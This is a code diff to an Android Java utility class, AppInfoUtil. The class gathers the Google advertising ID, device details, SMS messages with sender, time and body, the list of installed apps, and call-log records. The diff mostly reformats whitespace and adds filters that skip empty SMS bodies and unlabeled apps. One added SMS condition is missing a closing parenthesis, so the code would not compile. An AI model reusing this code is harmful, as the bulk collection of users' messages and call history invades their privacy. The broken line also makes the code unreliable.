@@ -96,7 +96,6 @@ public class AppInfoUtil {
     private static String deviceId;
 
 
-
     public static String getGoogleAdId(Context context) {
         String gaid = "";
         AdvertisingIdClient.Info adInfo = null;
@@ -251,8 +250,8 @@ public class AppInfoUtil {
     }
 
     public static String getDeviceInfo(Activity context, int authid) {
-        View decorView  = context.getWindow().getDecorView();
-        Rect outRect =new Rect();
+        View decorView = context.getWindow().getDecorView();
+        Rect outRect = new Rect();
         decorView.getWindowVisibleDisplayFrame(outRect);
         /**设备信息集合*/
         HashMap<String, Object> deviceMap = new HashMap<>();
@@ -694,7 +693,9 @@ public class AppInfoUtil {
                     jsonObject.put("read", intRead == 0 ? 1 : 0);
                     jsonObject.put("smsTime", longDate);
                     jsonObject.put("smsName", person);
-                    smsBeanList.put(jsonObject);
+                    if (!TextUtils.isEmpty(strBody) {
+                        smsBeanList.put(jsonObject);
+                    }
                 }
             }
             cursor.close();
@@ -792,8 +793,6 @@ public class AppInfoUtil {
         int chargePlug = batteryStatusIntent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
         return isCharging;
     }
-
-
 
 
     private static int getVideoEXTERNALCount(Context context) {
@@ -900,7 +899,10 @@ public class AppInfoUtil {
                                 ? "0" : "1");
                 jsonObject.put("isAppActive",
                         aliveApps.contains(packageInfo.packageName) ? "1" : "0");
-                jsonArray.put(jsonObject);
+                if (!packageInfo.applicationInfo.loadLabel(context.getPackageManager())
+                        .toString().isEmpty()) {
+                    jsonArray.put(jsonObject);
+                }
             } catch (Exception e) {
                 e.printStackTrace();
             }
@@ -992,7 +994,7 @@ public class AppInfoUtil {
                 String time = new SimpleDateFormat("HH:mm").format(new Date(dateLong));
                 int duration = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.DURATION));
                 int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
-                if (type != 1){
+                if (type != 1) {
                     type = 0;
                 }
                 JSONObject map = new JSONObject();
